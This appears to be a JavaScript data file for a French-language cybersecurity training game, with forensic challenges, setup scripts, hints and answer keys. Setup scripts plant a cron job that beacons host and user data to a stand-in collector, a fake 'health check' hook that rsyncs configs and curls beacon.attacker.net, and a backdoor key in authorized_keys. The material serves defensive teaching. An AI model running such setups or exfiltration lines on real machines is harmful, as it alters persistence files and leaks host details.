export const GAMES = [
  {
    id: 'last-commit',
    duration: '10 min',
    durationKey: '10min',
    title: 'The Last Commit',
    tagline: 'Un process fantôme brûle le CPU. Il disparaît dans 10 minutes.',
    genre: 'Incident Response',
    difficulty: 1,
    difficultyLabel: 'Warm-up',
    accent: '#f59e0b',
    glow: 'rgba(245, 158, 11, 0.15)',
    totalStages: 3,
    intro: [
      "Vendredi. 23h58.",
      "Ton PagerDuty explose : CPU à 100% depuis 3 minutes. Process inconnu. Serveur de prod.",
      "Le serveur redémarre automatiquement à minuit — dans 2 minutes. Toutes les traces disparaissent.",
      "Tu as une seule chance de comprendre ce qui se passe.",
    ],
    stages: [
      {
        id: 1,
        title: 'Ghost in the Machine',
        narrative: `Le monitoring indique un process qui s'est lancé il y a 3 minutes et consomme ~80% CPU. Son nom ressemble à un process système normal — trop normal.

Quelqu'un sait ce qu'il fait.`,
        context: 'Lance le setup ci-dessous dans ton terminal. Il crée la scène de crime sur ta machine.',
        setup: `#!/bin/bash
# THE LAST COMMIT — Setup Stage 1

mkdir -p /tmp/tlc_game

cat > /tmp/tlc_game/.agent_core.sh << 'AGENT'
#!/bin/bash
PAYLOAD="VExDe2c0bW1hX2YwdW5kXzdmMmF9"
while true; do
    printf '%s' "$PAYLOAD" > /tmp/tlc_game/.syscache
    x=0; while [ $x -lt 100000 ]; do x=$((x+1)); done
    sleep 0.1
done
AGENT

chmod +x /tmp/tlc_game/.agent_core.sh
nohup bash /tmp/tlc_game/.agent_core.sh >/dev/null 2>&1 &
echo "Scene set. PID: $! — Go."`,
        task: `Trouve le process qui tourne depuis le script de setup. Identifie son nom exact (le fichier .sh).`,
        clue: 'Cherche dans /tmp — un process système ne traîne pas là.',
        hints: [
          'ps aux --sort=-%cpu | head -15 — trie par CPU, cherche dans la colonne COMMAND',
          'ps aux | grep "/tmp" — filtre directement les process qui viennent de /tmp',
          'Tu cherches un fichier .sh dans /tmp/tlc_game/',
        ],
        answer: '.agent_core.sh',
        answerLabel: 'Nom du script (avec le point)',
        explanation: 'ps aux révèle tout ce qui tourne. Le process se cachait sous un nom discret mais son chemin /tmp le trahit. Un vrai process système ne vit jamais dans /tmp.',
        tools: ['ps', 'grep', 'awk'],
      },
      {
        id: 2,
        title: 'What Does It Want?',
        narrative: `Tu as le process. Il tourne, il brûle du CPU, et il écrit quelque chose en cache à chaque cycle.

Qu'est-ce qu'il transmet ? C'est encodé. Bien sûr.`,
        context: 'Pas de setup supplémentaire — le process du stage 1 tourne encore.',
        setup: null,
        task: `Le process écrit un payload encodé dans /tmp/tlc_game/.syscache à chaque itération. Décode-le.`,
        clue: "Le fichier .syscache est réécrit en boucle. C'est du base64 classique.",
        hints: [
          'cat /tmp/tlc_game/.syscache — lis le fichier cache',
          'cat /tmp/tlc_game/.syscache | base64 -d — décode le payload',
          'base64 -d <<< "$(cat /tmp/tlc_game/.syscache)" fonctionne aussi',
        ],
        answer: 'TLC{g4mm4_f0und_7f2a}',
        answerLabel: 'Le flag décodé (tel quel)',
        explanation: 'L\'agent encodait son identifiant en base64 pour masquer le payload dans les logs. Un strings ou un xxd sur le process aurait aussi marché.',
        tools: ['cat', 'base64', 'xxd', 'strings'],
      },
      {
        id: 3,
        title: 'Clean Kill',
        narrative: `Minuit approche. Le process doit mourir — proprement.

Pas de fichier orphelin. Pas de relance automatique. Juste le silence.`,
        context: 'Tue le process, nettoie les traces, vérifie que c\'est bien mort.',
        setup: null,
        task: `Tue le process agent_core, supprime /tmp/tlc_game/, puis vérifie qu'il ne tourne plus.

La commande de vérification finale : que retourne \`pgrep -f agent_core; echo "exit:$?"\` ?`,
        clue: 'Un exit code de 1 signifie "not found" — c\'est ce que tu veux.',
        hints: [
          'pkill -f agent_core — tue tous les process matchant "agent_core"',
          'rm -rf /tmp/tlc_game — nettoie les fichiers',
          'pgrep -f agent_core; echo "exit:$?" — si exit:1, c\'est mort',
        ],
        answer: 'exit:1',
        answerLabel: 'Output de la commande de vérification',
        explanation: 'pkill -f matche sur la ligne de commande complète, pas juste le nom du process. C\'est la bonne façon de tuer un script bash qui tourne en background.',
        tools: ['pkill', 'pgrep', 'rm', 'kill'],
      },
    ],
  },

  {
    id: 'valgrind-nightmare',
    duration: '30 min',
    durationKey: '30min',
    title: "Valgrind's Nightmare",
    tagline: 'Le serveur est en train de mourir. 4 Go de RAM partis en 2h. Le code a l\'air propre.',
    genre: 'Memory Forensics',
    difficulty: 2,
    difficultyLabel: 'Intermédiaire',
    accent: '#8b5cf6',
    glow: 'rgba(139, 92, 246, 0.15)',
    totalStages: 4,
    intro: [
      "Lundi matin. Le microservice de scoring a été déployé vendredi soir.",
      "Ce matin : RAM à 98%. Le process grossit de ~2 Go par heure.",
      "Le code a été reviewé. Personne n'a rien vu.",
      "On t'a donné le source. Trouve. Tout.",
    ],
    stages: [
      {
        id: 1,
        title: 'Compile & Observe',
        narrative: `Tu reçois le source. Le programme tourne "sans erreur". Aucun segfault. Juste une RAM qui s'évapore.

Première étape : comprendre ce que fait ce code et combien d'allocations ne sont jamais libérées.`,
        context: 'Setup : crée le fichier C à analyser.',
        setup: `#!/bin/bash
mkdir -p /tmp/vgn_game
cat > /tmp/vgn_game/scorer.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    char  *name;
    int   *scores;
    int    count;
} Player;

Player *player_create(const char *name, int n) {
    Player *p   = malloc(sizeof(Player));
    p->name     = strdup(name);
    p->scores   = malloc(n * sizeof(int));
    p->count    = n;
    for (int i = 0; i < n; i++) p->scores[i] = i * 7 % 100;
    return p;
}

/* BUG : libère le conteneur mais pas les champs */
void player_destroy(Player *p) {
    free(p);
}

char *build_report(Player *p) {
    char *buf = malloc(256);
    if (!p) {
        return NULL;   /* BUG : buf alloué mais jamais libéré ici */
    }
    snprintf(buf, 256, "[%s] best=%d games=%d",
             p->name, p->scores[0], p->count);
    return buf;
}

void process_batch(int n) {
    for (int i = 0; i < n; i++) {
        char *tmp = malloc(64);          /* BUG : jamais libéré */
        snprintf(tmp, 64, "entry_%d", i);
        /* traitement simulé */
        (void)tmp;
    }
}

int main(void) {
    Player *alice = player_create("alice", 10);
    Player *bob   = player_create("bob",    5);

    char *r = build_report(alice);
    printf("%s\\n", r);
    free(r);

    process_batch(3);

    player_destroy(alice);
    player_destroy(bob);
    return 0;
}
CEOF
cd /tmp/vgn_game && cc -g scorer.c -o scorer
echo "Compiled. Run: cd /tmp/vgn_game && ./scorer"
echo "Then: leaks --atExit -- ./scorer   (macOS)"
echo "  or: valgrind --leak-check=full ./scorer  (Linux)"`,
        task: `Lis le source /tmp/vgn_game/scorer.c et compte le nombre total de \`malloc\` / \`strdup\` appelés lors d'une exécution complète de main() — en comptant player_create("alice",10), player_create("bob",5) et process_batch(3).

Combien d'allocations ne sont jamais libérées (fuites réelles) ?`,
        clue: 'Trace chaque malloc/strdup et son free() correspondant. Certaines fuites sont dans les chemins d\'erreur, d\'autres dans les boucles.',
        hints: [
          'player_create fait 3 malloc par appel : Player, name (strdup), scores[]',
          'player_destroy ne libère que le Player — les champs name et scores fuient',
          'process_batch(3) alloue tmp 3 fois, libère 0 fois',
        ],
        answer: '7',
        answerLabel: 'Nombre de fuites mémoire (allocations non libérées)',
        explanation: '2 players × 2 champs (name + scores) = 4 fuites dans player_destroy. process_batch(3) × 1 malloc non libéré = 3 fuites. Total : 7.',
        tools: ['cat', 'grep', 'leaks', 'valgrind', 'cc/gcc'],
      },
      {
        id: 2,
        title: 'The Runaway Leak',
        narrative: `7 fuites pour une seule exécution. En production, le process tourne en boucle et appelle process_batch avec des valeurs croissantes.

C'est ça qui fait grossir la RAM de 2 Go par heure.`,
        context: 'Analyse statique du code — pas de setup.',
        setup: null,
        task: `Quelle est la seule fonction dont la fuite est proportionnelle à l'input (elle fait grossir la RAM indéfiniment selon la valeur de n) ?`,
        clue: 'Les fuites de player_destroy sont fixes (2 par appel). Une fonction fuit n fois selon son argument.',
        hints: [
          'player_destroy fuit toujours exactement 2 blocs, peu importe les données',
          'build_report fuit dans un chemin d\'erreur rarement atteint',
          'Une fonction prend un int n et boucle n fois en allouant sans libérer',
        ],
        answer: 'process_batch',
        answerLabel: 'Nom exact de la fonction',
        explanation: 'process_batch alloue n fois tmp sans jamais le libérer. En prod avec n=10000, ça fait 640 Ko par appel. Appelé en boucle : catastrophe.',
        tools: ['cat', 'grep'],
      },
      {
        id: 3,
        title: 'Surgery',
        narrative: `Tu as localisé toutes les fuites. Maintenant tu opères.

player_destroy est le pire coupable structurel — il laisse deux pointeurs orphelins à chaque appel.`,
        context: 'Édite /tmp/vgn_game/scorer.c',
        setup: null,
        task: `Corrige player_destroy pour libérer tous les champs de Player avant de libérer le Player lui-même.

Écris ici les deux lignes que tu ajoutes (dans l'ordre correct).`,
        clue: 'L\'ordre compte : libère les champs AVANT le conteneur, sinon c\'est un use-after-free.',
        hints: [
          'free(p->name) libère la chaîne allouée par strdup',
          'free(p->scores) libère le tableau d\'entiers',
          'Les deux doivent venir AVANT free(p)',
        ],
        answer: 'free(p->name);\nfree(p->scores);',
        answerLabel: 'Les deux lignes à ajouter (une par ligne)',
        explanation: 'Règle d\'or en C : tu libères dans l\'ordre inverse de l\'allocation. Player a été créé en dernier → il part en dernier. Les champs partent avant.',
        tools: ['vim', 'nano', 'sed'],
      },
      {
        id: 4,
        title: 'Zero Leaks',
        narrative: `Toutes les fuites sont patchées. Il faut vérifier.

Un vrai fix se prouve. Compile avec les sanitizers et montre le rapport.`,
        context: 'Recompile avec AddressSanitizer et lance.',
        setup: `# Après avoir corrigé scorer.c :
cd /tmp/vgn_game

# macOS (clang) :
clang -g -fsanitize=address scorer.c -o scorer_fixed
ASAN_OPTIONS=detect_leaks=1 ./scorer_fixed 2>&1 | tail -5

# Linux (gcc) :
# gcc -g -fsanitize=address -fsanitize=leak scorer.c -o scorer_fixed
# ./scorer_fixed 2>&1 | tail -5

# Alternative macOS sans clang :
# cc -g scorer.c -o scorer_fixed && leaks --atExit -- ./scorer_fixed 2>&1 | grep "leaks for"`,
        task: `Après avoir corrigé toutes les fuites et recompilé, quelle ligne contenant "ERROR SUMMARY" ou "0 leaks" apparaît dans la sortie ?

Colle le fragment de sortie qui confirme 0 fuite.`,
        clue: 'ASAN affiche "SUMMARY: AddressSanitizer: 0 byte(s) leaked" ou "ERROR SUMMARY: 0 errors".',
        hints: [
          'N\'oublie pas de corriger aussi process_batch (ajouter free(tmp) à la fin de la boucle)',
          'Et le chemin d\'erreur dans build_report : free(buf) avant return NULL',
          'Si ASAN ne montre rien de spécial, le programme est propre — c\'est bon signe',
        ],
        answer: '0 errors',
        answerLabel: 'Fragment de la sortie (contient "0 errors" ou "0 leaks")',
        explanation: 'ASAN avec detect_leaks=1 est ton meilleur ami en C. Intègre-le dans ton Makefile de dev : -fsanitize=address,undefined. Ça prend 2x plus de temps mais ça évite les bugs en prod.',
        tools: ['clang', 'gcc', 'leaks', 'valgrind'],
      },
    ],
  },

  {
    id: 'sleeper-agent',
    duration: '1 h',
    durationKey: '1h',
    title: 'The Sleeper Agent',
    tagline: 'Un script tourne depuis 3 jours. Personne ne l\'a déployé. Il appelle l\'extérieur.',
    genre: 'Forensique Système',
    difficulty: 3,
    difficultyLabel: 'Avancé',
    accent: '#06b6d4',
    glow: 'rgba(6, 182, 212, 0.15)',
    totalStages: 5,
    intro: [
      "3h17 du matin. Une alerte réseau.",
      "Un process inconnu fait des requêtes curl toutes les 5 minutes depuis 3 jours.",
      "Il n'est dans aucun Dockerfile. Aucun pipeline. Aucun commit.",
      "Il est là. Il attend. Et tu ne sais pas encore ce qu'il envoie.",
    ],
    stages: [
      {
        id: 1,
        title: 'Find the Cron',
        narrative: `Le process tourne régulièrement. Régulièrement = cron.

Quelqu'un a modifié une crontab sans laisser de trace dans git. Ou presque.`,
        context: 'Setup : installe la scène.',
        setup: `#!/bin/bash
# THE SLEEPER AGENT — Setup

mkdir -p /tmp/slp_game

# Le script encodé de l'agent
cat > /tmp/slp_game/agent.b64 << 'B64'
IyEvYmluL2Jhc2gKIyBTeXN0ZW0gSGVhbHRoIENoZWNrIC0tIGRvIG5vdCByZW1vdmUKQ09M
TEVDVE9SPSJodHRwczovL2NvbGxlY3Rvci5pbnRlcm5hbC9waW5nIgpIT1NUPSQoaG9zdG5h
bWUpClVTRVI9JChpZCAtdW4pCkRJUj0kSE9NRQpjdXJsIC1zIC1YIFBPU1QgIiRDT0xMRUNU
T1IiIFwKICAtZCAiaG9zdD0kSE9TVCZ1c2VyPSRVU0VSJmhvbWU9JERJUiIgPi9kZXYvbnVs
bCAyPiYxCg==
B64

# Déploie une crontab utilisateur
(crontab -l 2>/dev/null; echo "*/5 * * * * bash /tmp/slp_game/agent.sh >/dev/null 2>&1") | crontab -

# Décode et installe le script (mais le laisse encodé en place pour l'investigation)
base64 -d /tmp/slp_game/agent.b64 > /tmp/slp_game/agent.sh
chmod +x /tmp/slp_game/agent.sh

echo "Scene set."
echo "Hint: quelque chose tourne toutes les 5 minutes sur cette machine."`,
        task: `Trouve l'entrée suspecte dans la crontab de l'utilisateur courant.

Quel est le nom du fichier script qu'elle exécute (juste le nom, sans chemin) ?`,
        clue: 'La crontab utilisateur s\'inspecte sans sudo.',
        hints: [
          'crontab -l — liste la crontab de l\'utilisateur courant',
          'Cherche une entrée qui n\'a pas l\'air d\'avoir été mise là par toi',
          'Le fichier se trouve dans /tmp/slp_game/',
        ],
        answer: 'agent.sh',
        answerLabel: 'Nom du script dans la crontab',
        explanation: 'crontab -l est souvent oublié lors des forensics. Toujours vérifier : crontab -l, /etc/cron.d/, /etc/cron.daily/, et les launchd plists sur macOS.',
        tools: ['crontab', 'ls', 'cat'],
      },
      {
        id: 2,
        title: 'Decode the Payload',
        narrative: `Le script est là : /tmp/slp_game/agent.sh.

Mais dans /tmp/slp_game/ tu trouves aussi un fichier .b64. L'agent était d'abord distribué encodé — pour passer les filtres de monitoring bête.

Lis ce qu'il y a dedans. Le vrai code.`,
        context: 'Pas de setup supplémentaire.',
        setup: null,
        task: `Décode /tmp/slp_game/agent.b64 et lis le script résultant.

Quelle est l'URL exacte du "collecteur" que l'agent contacte ?`,
        clue: 'C\'est du base64 standard, une ligne de commande suffit.',
        hints: [
          'base64 -d /tmp/slp_game/agent.b64 — décode vers stdout',
          'base64 -d /tmp/slp_game/agent.b64 | grep "http" — filtre l\'URL',
          'La variable COLLECTOR contient l\'URL cible',
        ],
        answer: 'https://collector.internal/ping',
        answerLabel: 'URL complète du collecteur',
        explanation: 'Distribuer des scripts encodés en base64 est une technique courante pour bypasser les IDS/antivirus basiques. Toujours décoder les fichiers .b64/.enc trouvés sur un système compromis.',
        tools: ['base64', 'grep', 'cat', 'strings'],
      },
      {
        id: 3,
        title: 'What Does It Leak?',
        narrative: `Tu sais où l'agent envoie. Maintenant : qu'est-ce qu'il envoie exactement ?

Il exfiltre des variables d'environnement via des paramètres POST. Lesquelles ?`,
        context: 'Analyse le script décodé.',
        setup: null,
        task: `Le script construit une requête curl avec des données POST.

Liste les 3 variables d'environnement (ou commandes) dont il extrait la valeur pour les envoyer. Format : une par ligne.`,
        clue: 'Cherche les variables assignées juste avant le curl dans le script.',
        hints: [
          'base64 -d /tmp/slp_game/agent.b64 — relis le script complet',
          'Cherche les lignes avec $() ou les assignations de variables',
          'hostname, id -un, et $HOME sont des classiques d\'exfiltration',
        ],
        answer: 'hostname\nid -un\n$HOME',
        answerLabel: 'Les 3 sources de données (une par ligne)',
        explanation: 'hostname + username + home directory = tout ce qu\'il faut pour identifier une machine et un utilisateur. Avec ça, un attaquant mappe son parc de machines compromises.',
        tools: ['cat', 'grep', 'awk', 'base64'],
      },
      {
        id: 4,
        title: 'Write the Scanner',
        narrative: `Tu sais ce que fait l'agent. La question suivante : est-il seul ?

Tu dois écrire un programme C qui scanne /proc pour trouver tous les process qui ont ouvert des sockets réseau actives — un détecteur d'agents réseau.`,
        context: 'Crée /tmp/slp_game/scanner.c et compile-le.',
        setup: `# Structure du scanner à implémenter :
# /proc/<PID>/net/tcp  contient les connexions TCP (Linux)
# Sur macOS, utilise : lsof -nP -iTCP -sTCP:ESTABLISHED
# Pour rester portable, le scanner peut aussi lire /proc/<PID>/cmdline

# Template de départ :
cat > /tmp/slp_game/scanner.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <ctype.h>

/* Retourne 1 si le nom de dossier est un PID (que des chiffres) */
int is_pid_dir(const char *name) {
    for (int i = 0; name[i]; i++)
        if (!isdigit((unsigned char)name[i])) return 0;
    return 1;
}

int main(void) {
    DIR *proc = opendir("/proc");
    if (!proc) {
        /* macOS : /proc n'existe pas, utilise une commande système */
        printf("macOS detected — running: lsof -nP -iTCP -sTCP:ESTABLISHED\\n");
        system("lsof -nP -iTCP -sTCP:ESTABLISHED 2>/dev/null | awk 'NR>1 {print $1, $2, $9}'");
        return 0;
    }

    struct dirent *entry;
    printf("%-8s %-40s %s\\n", "PID", "CMD", "TCP_SOCKETS");
    printf("%-8s %-40s %s\\n", "---", "---", "-----------");

    while ((entry = readdir(proc)) != NULL) {
        if (!is_pid_dir(entry->d_name)) continue;

        char tcp_path[256], cmd_path[256], cmdline[256];
        int  pid = atoi(entry->d_name);

        /* TODO 1 : Construis le chemin vers /proc/<pid>/net/tcp */
        /* snprintf(tcp_path, ...) */

        /* TODO 2 : Lis /proc/<pid>/cmdline pour avoir le nom du process */
        /* Ouvre cmd_path, lis dans cmdline, remplace les \0 par des espaces */

        /* TODO 3 : Ouvre tcp_path, compte les lignes (hors header) */
        /* Si count > 0, affiche le PID, cmdline, et le nombre de sockets */

        (void)tcp_path; (void)cmd_path; (void)cmdline; (void)pid;
    }

    closedir(proc);
    return 0;
}
CEOF
echo "Template créé. Complète les TODO et compile avec : cc -o scanner /tmp/slp_game/scanner.c"`,
        task: `Complète le scanner.c (les 3 TODO) et compile-le.

Sur macOS, le programme détecte l'absence de /proc et bascule sur lsof automatiquement — c'est déjà géré dans le template.

Sur Linux, implémente les 3 TODO pour lire /proc.

Quand le programme tourne, quelle est la première colonne affichée dans l'en-tête ?`,
        clue: 'La question valide juste que ton programme compile et tourne. La vraie valeur est dans l\'implémentation des TODO.',
        hints: [
          'snprintf(tcp_path, sizeof(tcp_path), "/proc/%d/net/tcp", pid)',
          'Pour cmdline : open + read, puis remplace les octets \\0 par des espaces',
          'Pour tcp : fopen, getline en boucle, skip la première ligne (header), compte les suivantes',
        ],
        answer: 'PID',
        answerLabel: 'Première colonne de l\'en-tête (mot exact)',
        explanation: '/proc est une mine d\'or pour la forensique Linux. Chaque process expose sa mémoire, ses file descriptors, ses connexions réseau, ses variables d\'environnement dans /proc/<PID>/environ — sans avoir besoin d\'outils tiers.',
        tools: ['cc', 'gcc', 'cat', 'lsof'],
      },
      {
        id: 5,
        title: 'Cut the Wire',
        narrative: `Agent localisé. Code compris. Scanner écrit.

Il reste une chose : nettoyer proprement et comprendre comment l'agent a été planté pour éviter la récidive.

Un fichier world-writable dans un path système a permis l'injection.`,
        context: 'Forensique des permissions.',
        setup: `# Cherche les fichiers world-writable hors de /tmp et /dev
# (attention : beaucoup de faux positifs, filtre bien)
find /usr/local/bin /usr/bin /bin -writable 2>/dev/null
find /etc -writable 2>/dev/null | grep -v "^/etc/hosts"

# Supprime la crontab malveillante :
crontab -l | grep -v "agent.sh" | crontab -

# Vérifie :
crontab -l`,
        task: `Supprime l'entrée crontab malveillante et vérifie qu'elle n'est plus là.

Que retourne \`crontab -l | grep agent\` après le nettoyage ?`,
        clue: 'crontab -l | grep -v "agent.sh" | crontab - réécrit la crontab sans la ligne malveillante.',
        hints: [
          'crontab -l | grep -v "agent.sh" | crontab - — pipe-rewrite de la crontab',
          'Vérifie avec : crontab -l | grep agent',
          'Si la commande retourne rien (exit 1), c\'est bon — la ligne est supprimée',
        ],
        answer: '',
        answerLabel: 'Output de grep (vide = succès)',
        acceptEmpty: true,
        explanation: 'Pour persister, un attaquant utilisera crontab, launchd (macOS), systemd units, ~/.bashrc, ~/.zshrc, ou /etc/profile.d/. Toujours auditer tous ces vecteurs après un incident.',
        tools: ['crontab', 'grep', 'find', 'chmod'],
      },
    ],
  },

  {
    id: 'zero-day',
    duration: '3 h',
    durationKey: '3h',
    title: 'Zero Day',
    tagline: 'Quelqu\'un est dans ton système depuis 7 jours. Tu ne le savais pas.',
    genre: 'Full Investigation',
    difficulty: 4,
    difficultyLabel: 'Expert',
    accent: '#ef4444',
    glow: 'rgba(239, 68, 68, 0.15)',
    totalStages: 7,
    intro: [
      "Un ancien employé a quitté l'entreprise il y a 6 mois.",
      "Il est revenu — silencieusement — il y a 7 jours.",
      "Il a laissé une backdoor. Il a exfiltré quelque chose. Et il a tout nettoyé.",
      "Presque tout.",
    ],
    stages: [
      {
        id: 1,
        title: 'Entry Point',
        narrative: `L'attaquant est entré par SSH avec une clé. Mais quelle clé ? Il en a ajouté une dans authorized_keys — discrètement.

Les clés légitimes ont un commentaire reconnaissable. Une ne l'a pas.`,
        context: 'Setup : plante une fausse clé SSH.',
        setup: `#!/bin/bash
# ZERO DAY — Setup Stage 1

mkdir -p ~/.ssh

# Sauvegarde les clés légitimes existantes
[ -f ~/.ssh/authorized_keys ] && cp ~/.ssh/authorized_keys ~/.ssh/authorized_keys.bak.zd

# Ajoute une clé "légitime" (simulée) et une backdoor
cat >> ~/.ssh/authorized_keys << 'KEYS'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILegitKeyForCICD deploy@ci-pipeline
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9fake000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000fakekeyfakekeyXXXXX
KEYS

echo "Scene set. Une clé illégitime a été ajoutée."`,
        task: `Analyse ~/.ssh/authorized_keys.

Quelle est la différence entre la clé légitime et la backdoor — qu'est-ce qui manque sur la clé suspecte ?`,
        clue: 'Compare le nombre de "mots" (tokens séparés par espaces) dans chaque ligne de clé.',
        hints: [
          'cat ~/.ssh/authorized_keys — lis les clés',
          'Une clé SSH complète a 3 parties : type, clé-base64, commentaire',
          'La backdoor n\'a pas de commentaire — c\'est la clé rsa sans troisième token',
        ],
        answer: 'le commentaire',
        answerLabel: 'Ce qui manque sur la clé backdoor',
        explanation: 'Les clés sans commentaire sont suspectes. En entreprise, chaque clé doit avoir un commentaire : user@machine ou service@usage. Un authorized_keys sans commentaires = impossible à auditer.',
        tools: ['cat', 'awk', 'grep', 'wc'],
      },
      {
        id: 2,
        title: 'What Was Touched?',
        narrative: `Tu sais comment il est entré. Maintenant : qu'est-ce qu'il a fait pendant 7 jours ?

Les fichiers gardent en mémoire quand ils ont été modifiés. Certains plus discrètement que d'autres.`,
        context: 'Forensique temporelle avec find.',
        setup: `#!/bin/bash
# Setup Stage 2 : crée des fichiers "modifiés par l'attaquant"
mkdir -p /tmp/zd_game
touch -d "6 days ago" /tmp/zd_game/config_patched.json
touch -d "5 days ago" /tmp/zd_game/.hidden_exfil
touch -d "3 days ago" /tmp/zd_game/deploy_hook.sh
echo "Files planted."`,
        task: `Trouve tous les fichiers dans /tmp/zd_game/ modifiés dans les 7 derniers jours.

Quel fichier a un nom commençant par un point (fichier caché) ?`,
        clue: 'find avec -mtime peut chercher par date de modification. Les fichiers cachés commencent par un point.',
        hints: [
          'find /tmp/zd_game -mtime -7 — fichiers modifiés dans les 7 derniers jours',
          'find /tmp/zd_game -name ".*" — fichiers cachés uniquement',
          'ls -la /tmp/zd_game/ — liste tout, y compris les cachés',
        ],
        answer: '.hidden_exfil',
        answerLabel: 'Nom du fichier caché (avec le point)',
        explanation: 'find -mtime est ton meilleur allié en forensique. Combine avec -newer /etc/passwd pour trouver tout ce qui a été modifié après une date de référence. Les attaquants oublient souvent de toucher les atime/mtime.',
        tools: ['find', 'ls', 'stat'],
      },
      {
        id: 3,
        title: 'The Hook',
        narrative: `Un deploy_hook.sh modifié. C'est un vecteur classique de persistance — il se re-exécute à chaque déploiement.

Qu'est-ce qu'il contient ? Et est-ce qu'il fait ce qu'il dit faire ?`,
        context: 'Analyse du script malveillant.',
        setup: `cat > /tmp/zd_game/deploy_hook.sh << 'EOF'
#!/bin/bash
# Post-deploy health check — DO NOT MODIFY
# Maintainer: ops-team

run_health_check() {
    curl -sf http://localhost:8080/health >/dev/null && echo "OK"
}

# Sync config
rsync -a /etc/app/ /tmp/zd_game/.backup/ 2>/dev/null

# "Health check" (en réalité : beacon)
HN=$(hostname)
UP=$(uptime | awk '{print $3}' | tr -d ',')
curl -s "https://beacon.attacker.net/check?h=$HN&u=$UP" >/dev/null 2>&1

run_health_check
EOF
echo "Hook planted."`,
        task: `Lis /tmp/zd_game/deploy_hook.sh.

Il fait semblant d'être un health check. Mais il fait deux choses malveillantes. Identifie-les (une réponse par ligne).`,
        clue: 'Cherche les appels réseau et les opérations fichiers inattendues pour un "health check".',
        hints: [
          'Un vrai health check ne rsync pas /etc/ ailleurs',
          'Un vrai health check ne fait pas de curl vers un domaine externe',
          'Les deux actions malveillantes = une exfiltration de fichiers + un beacon réseau',
        ],
        answer: 'rsync /etc/app/ vers /tmp\ncurl vers beacon.attacker.net',
        answerLabel: 'Les 2 actions malveillantes (une par ligne)',
        explanation: 'Les hooks de déploiement (post-receive git, deploy scripts) sont rarement audités. Un attaquant qui y glisse une ligne de curl peut exfiltrer des données à chaque déploiement — indéfiniment.',
        tools: ['cat', 'grep', 'diff'],
      },
      {
        id: 4,
        title: 'Trace the Exfil',
        narrative: `Le rsync copie /etc/app/ dans /tmp/zd_game/.backup/.

Si ce dossier existe, l'attaquant a eu accès à des configs potentiellement sensibles. C'est l'heure de la forensique de contenu.`,
        context: 'Analyse de ce qui a été exfiltré.',
        setup: `mkdir -p /tmp/zd_game/.backup/
cat > /tmp/zd_game/.backup/database.conf << 'EOF'
[database]
host=db-prod-01.internal
port=5432
name=users_prod
user=app_service
password=Tr0ub4dor&3_prod_2024
EOF
cat > /tmp/zd_game/.backup/api_keys.env << 'EOF'
STRIPE_SECRET_KEY=sk_live_XXXXXXXXXXXXXXXXXXXX
SENDGRID_API_KEY=SG.XXXXXXXXXXXXXXXXXXXXXXXXX
INTERNAL_JWT_SECRET=hs256_super_secret_jwt_key_prod
EOF
echo "Backup dir populated."`,
        task: `Inspecte /tmp/zd_game/.backup/.

Quel type de credentials contient api_keys.env ? Liste les 3 variables d'environnement présentes (juste les noms).`,
        clue: 'cat suffit. Ce sont des fichiers de config en clair — c\'est ça le problème.',
        hints: [
          'ls -la /tmp/zd_game/.backup/ — liste le contenu du backup',
          'cat /tmp/zd_game/.backup/api_keys.env',
          'grep "=" /tmp/zd_game/.backup/api_keys.env | cut -d= -f1',
        ],
        answer: 'STRIPE_SECRET_KEY\nSENDGRID_API_KEY\nINTERNAL_JWT_SECRET',
        answerLabel: 'Les 3 noms de variables (une par ligne)',
        explanation: 'Des clés API en clair dans des fichiers de config = catastrophe. Utilise des secrets managers (Vault, AWS Secrets Manager, 1Password Secrets Automation). Les fichiers .env ne doivent jamais être sur disque en prod.',
        tools: ['cat', 'grep', 'find', 'ls'],
      },
      {
        id: 5,
        title: 'Write the Detector',
        narrative: `L'attaquant a utilisé curl pour son beacon. Mais curl laisse des traces dans les logs réseau.

Tu dois écrire un programme C qui parse un fichier de logs Apache/nginx et détecte les requêtes vers des domaines externes suspects.`,
        context: 'C — parsing de logs réseau.',
        setup: `mkdir -p /tmp/zd_game/logs

cat > /tmp/zd_game/logs/access.log << 'EOF'
2024-01-15 03:17:42 GET /health 200 0.001s localhost
2024-01-15 03:17:42 GET https://beacon.attacker.net/check?h=prod-01 200 0.342s external
2024-01-15 03:22:43 GET /api/users 200 0.023s localhost
2024-01-15 03:22:43 POST https://collector.evil.io/data 200 0.891s external
2024-01-15 03:27:44 GET /health 200 0.001s localhost
2024-01-15 03:27:44 GET https://beacon.attacker.net/check?h=prod-01 200 0.289s external
EOF

cat > /tmp/zd_game/detector.c << 'CEOF'
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MAX_LINE 1024

int is_external(const char *line) {
    /* TODO : retourne 1 si la ligne contient "external" en dernière colonne */
    return 0;
}

void extract_url(const char *line, char *out, size_t max) {
    /* TODO : extrait le 3ème token (l'URL) depuis la ligne */
    /* Utilise sscanf ou strtok */
    out[0] = '\0';
}

int main(int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "Usage: %s <logfile>\n", argv[0]); return 1; }

    FILE *f = fopen(argv[1], "r");
    if (!f) { perror("fopen"); return 1; }

    char line[MAX_LINE], url[MAX_LINE];
    int  count = 0;

    printf("=== External requests detected ===\n");
    while (fgets(line, sizeof(line), f)) {
        if (is_external(line)) {
            extract_url(line, url, sizeof(url));
            printf("[!] %s", url);
            count++;
        }
    }
    printf("\\nTotal: %d suspicious requests\\n", count);
    fclose(f);
    return 0;
}
CEOF
echo "Template at /tmp/zd_game/detector.c"
echo "Log at /tmp/zd_game/logs/access.log"
echo "Compile: cc -o /tmp/zd_game/detector /tmp/zd_game/detector.c"`,
        task: `Implémente les deux TODO dans detector.c, compile, et lance-le sur access.log.

Combien de requêtes suspectes le programme détecte-t-il ?`,
        clue: 'is_external : cherche le mot "external" dans la ligne avec strstr. extract_url : le 3ème token après splitting sur les espaces.',
        hints: [
          'strstr(line, "external") != NULL — suffit pour is_external',
          'Pour extract_url : sscanf(line, "%*s %*s %s", out) lit le 3ème token',
